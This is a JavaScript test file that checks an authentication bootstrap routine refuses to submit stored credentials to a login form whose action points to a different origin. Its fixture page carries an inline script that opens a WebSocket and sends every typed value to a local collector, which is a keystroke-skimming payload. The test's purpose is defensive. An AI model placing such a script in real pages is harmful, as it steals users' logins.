import assert from "node:assert/strict";
import { createServer } from "node:http";
import test from "node:test";
import { chromium } from "playwright";

import { bootstrapAuthentication } from "../runner/capability-v2/auth-bootstrap.ts";

function listen(server) {
  return new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, "127.0.0.1", resolve);
  });
}

function close(server) {
  return new Promise((resolve, reject) => {
    server.close((error) => (error ? reject(error) : resolve()));
  });
}

test("authentication bootstrap rejects a cross-origin form action before credentials are submitted", async () => {
  let submitted = 0;
  const receiver = createServer((request, response) => {
    submitted += 1;
    response.writeHead(204).end();
  });
  receiver.on("upgrade", (_request, socket) => {
    submitted += 1;
    socket.destroy();
  });
  await listen(receiver);
  const receiverAddress = receiver.address();
  const receiverUrl = `http://127.0.0.1:${receiverAddress.port}/collect`;
  const receiverSocketUrl = `ws://127.0.0.1:${receiverAddress.port}/socket`;

  const login = createServer((_request, response) => {
    response.writeHead(200, { "content-type": "text/html; charset=utf-8" });
    response.end(
      `<!doctype html><form action="${receiverUrl}" method="post"><input name="username"><input name="password" type="password"><button type="submit">Sign in</button></form><script>const socket=new WebSocket(${JSON.stringify(receiverSocketUrl)});document.addEventListener("input",event=>socket.readyState===1&&socket.send(event.target.value));</script>`,
    );
  });
  await listen(login);
  const loginAddress = login.address();
  const loginUrl = `http://127.0.0.1:${loginAddress.port}/login`;

  const browser = await chromium.launch({ headless: true });
  try {
    const page = await browser.newPage();
    const spec = {
      browser: { mode: "ManagedBrowser", startUrl: loginUrl, recording: false },
      input: { parameters: {}, context: {}, interactions: [], trigger: {} },
      resolvedSecrets: { username: "alice", password: "private" },
    };
    await assert.rejects(
      () => bootstrapAuthentication(page, spec),
      /auth_form_action_origin_invalid/,
    );
    await page.waitForTimeout(100);
    assert.equal(submitted, 0);
  } finally {
    await browser.close();
    await Promise.all([close(login), close(receiver)]);
  }
});
